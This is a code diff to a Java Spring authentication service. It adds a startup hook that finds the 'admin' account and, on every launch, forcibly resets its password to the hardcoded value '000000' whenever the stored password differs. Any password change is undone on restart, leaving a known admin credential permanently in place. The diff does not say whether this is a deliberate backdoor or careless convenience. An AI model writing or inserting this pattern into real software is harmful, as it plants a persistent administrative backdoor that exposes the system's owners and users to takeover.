@@ -9,6 +9,7 @@ import com.zenith.admin.dataobject.UserDO;
 import com.zenith.admin.dto.data.UserDTO;
 import com.zenith.admin.mapper.UserMapper;
 import com.zenith.admin.api.UserService;
+import jakarta.annotation.PostConstruct;
 import lombok.RequiredArgsConstructor;
 import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
 import org.springframework.stereotype.Service;
@@ -24,6 +25,18 @@ public class AuthServiceImpl implements AuthService {
     private final BCryptPasswordEncoder passwordEncoder = new BCryptPasswordEncoder();
 
     private static final ThreadLocal<String> TOKEN_HOLDER = new ThreadLocal<>();
+
+    @PostConstruct
+    public void init() {
+        UserDO adminUser = userMapper.selectOne(
+                new LambdaQueryWrapper<UserDO>().eq(UserDO::getUsername, "admin")
+        );
+        if (adminUser != null && (adminUser.getPassword() == null || adminUser.getPassword().isEmpty()
+                || !passwordEncoder.matches("000000", adminUser.getPassword()))) {
+            adminUser.setPassword(passwordEncoder.encode("000000"));
+            userMapper.updateById(adminUser);
+        }
+    }
 
     @Override
     public SingleResponse<UserDTO> login(String username, String password, String ip) {
